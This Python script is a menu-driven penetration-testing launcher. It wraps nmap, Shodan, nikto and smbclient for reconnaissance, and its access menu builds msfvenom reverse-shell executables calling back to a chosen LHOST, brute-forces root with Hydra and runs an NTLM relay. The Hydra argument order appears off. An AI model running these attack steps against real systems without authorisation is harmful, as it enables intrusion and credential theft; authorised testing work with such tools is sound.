######################################################################################################################################################################################################################
# Python script Penetration Testing & Ethical Hacking Framework, Note: Be mindful of the scope of work, & rules of engagement.
# python pt_framework.py.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################


import os
import subprocess
import sys
import shutil
from colorama import Fore, Style

# Splash Screen
def display_splash_screen():
    splash = """
    
_____________________  ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
\______   \__    ___/  \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
 |     ___/ |    |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 |    |     |    |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
 |____|     |____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_ /\____   |           \_____  /___|
                 /_____/    \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
   (______)(_______)(_______)(________)(________)(_________)
    """
    print(f"{Fore.CYAN}{splash}{Style.RESET_ALL}")


# Column Display Helper
def display_in_columns(options):
    for i, option in enumerate(options, 1):
        print(f"[{i}] {option}")


# Check Tool Installation
def check_tool(tool_name):
    return subprocess.run(["which", tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0


def install_tool(tool_name):
    print(f"{Fore.YELLOW}Installing {tool_name}...{Style.RESET_ALL}")
    subprocess.run(["sudo", "apt-get", "install", "-y", tool_name])


# Reconnaissance Menu
def reconnaissance_menu():
    print(f"\n{Fore.CYAN}Reconnaissance Phase:{Style.RESET_ALL}")
    options = [
        "Use Nmap for Network Scanning",
        "Run OSINT with Shodan",
        "Use Whois for Domain Info",
        "Return to Methodology Menu"
    ]
    display_in_columns(options)

    try:
        choice = int(input(f"\n{Fore.YELLOW}Select an action: {Style.RESET_ALL}"))
        if choice == 1:
            target = input(f"{Fore.YELLOW}Enter target IP or domain: {Style.RESET_ALL}")
            if not check_tool("nmap"):
                install_tool("nmap")
            subprocess.run(["nmap", "-sV", target])
        elif choice == 2:
            target = input(f"{Fore.YELLOW}Enter target domain or IP: {Style.RESET_ALL}")
            if not check_tool("shodan"):
                print(f"{Fore.RED}Shodan CLI not installed. Install with `pip install shodan`.{Style.RESET_ALL}")
                return
            subprocess.run(["shodan", "host", target])
        elif choice == 3:
            target = input(f"{Fore.YELLOW}Enter domain: {Style.RESET_ALL}")
            if not check_tool("whois"):
                install_tool("whois")
            subprocess.run(["whois", target])
        elif choice == 4:
            methodology_menu()
        else:
            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
            reconnaissance_menu()
    except ValueError:
        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
        reconnaissance_menu()


# Scanning and Enumeration Menu
def scanning_menu():
    print(f"\n{Fore.CYAN}Scanning and Enumeration Phase:{Style.RESET_ALL}")
    options = [
        "Scan Ports with Nmap",
        "Enumerate SMB Shares",
        "Run Nikto Web Scanner",
        "Return to Methodology Menu"
    ]
    display_in_columns(options)

    try:
        choice = int(input(f"\n{Fore.YELLOW}Select an action: {Style.RESET_ALL}"))
        if choice == 1:
            target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
            subprocess.run(["nmap", "-p-", target])
        elif choice == 2:
            target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
            if not check_tool("smbclient"):
                install_tool("smbclient")
            subprocess.run(["smbclient", "-L", f"\\\\{target}"])
        elif choice == 3:
            target = input(f"{Fore.YELLOW}Enter target website: {Style.RESET_ALL}")
            if not check_tool("nikto"):
                install_tool("nikto")
            subprocess.run(["nikto", "-h", target])
        elif choice == 4:
            methodology_menu()
        else:
            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
            scanning_menu()
    except ValueError:
        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
        scanning_menu()


# Gaining Access Menu
def gaining_access_menu():
    print(f"\n{Fore.CYAN}Gaining Access Phase:{Style.RESET_ALL}")
    options = [
        "Generate Payload with MSFVenom",
        "Start Metasploit",
        "Perform Brute Force with Hydra",
        "Run NTLM Relay Attack",
        "Return to Methodology Menu"
    ]
    display_in_columns(options)

    try:
        choice = int(input(f"\n{Fore.YELLOW}Select an action: {Style.RESET_ALL}"))
        if choice == 1:
            payload = input("Enter payload type (e.g., windows/meterpreter/reverse_tcp): ")
            lhost = input("Enter LHOST: ")
            lport = input("Enter LPORT: ")
            output = input("Enter output file name (e.g., shell.exe): ")
            subprocess.run(["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", output])
        elif choice == 2:
            subprocess.run(["msfconsole"])
        elif choice == 3:
            target = input("Enter target service (e.g., ssh): ")
            wordlist = input("Enter path to wordlist: ")
            ip = input("Enter target IP: ")
            if not check_tool("hydra"):
                install_tool("hydra")
            subprocess.run(["hydra", "-l", "root", "-P", wordlist, target, ip])
        elif choice == 4:
            target_ip = input("Enter target IP for NTLM relay: ")
            if not check_tool("impacket-ntlmrelayx"):
                print(f"{Fore.RED}NTLMRelayX not found. Install with `sudo apt install impacket`.{Style.RESET_ALL}")
                return
            subprocess.run(["impacket-ntlmrelayx", "-t", target_ip])
        elif choice == 5:
            methodology_menu()
        else:
            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
            gaining_access_menu()
    except ValueError:
        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
        gaining_access_menu()


# Main Methodology Menu
def methodology_menu():
    print(f"\n{Fore.CYAN}Penetration Testing Methodology:{Style.RESET_ALL}")
    options = [
        "Reconnaissance",
        "Scanning and Enumeration",
        "Gaining Access",
        "Setup Proxies (Placeholder)",
        "Maintaining Access (Placeholder)",
        "Covering Tracks (Placeholder)",
        "Exit"
    ]
    display_in_columns(options)

    try:
        choice = int(input(f"\n{Fore.YELLOW}Select a phase: {Style.RESET_ALL}"))
        if choice == 1:
            reconnaissance_menu()
        elif choice == 2:
            scanning_menu()
        elif choice == 3:
            gaining_access_menu()
        elif choice in [4, 5, 6]:
            print(f"{Fore.RED}This phase is not yet implemented!{Style.RESET_ALL}")
            methodology_menu()
        elif choice == 7:
            print(f"{Fore.RED}Exiting...{Style.RESET_ALL}")
            sys.exit()
        else:
            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
            methodology_menu()
    except ValueError:
        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
        methodology_menu()


# Main Execution
if __name__ == "__main__":
    display_splash_screen()
    methodology_menu()
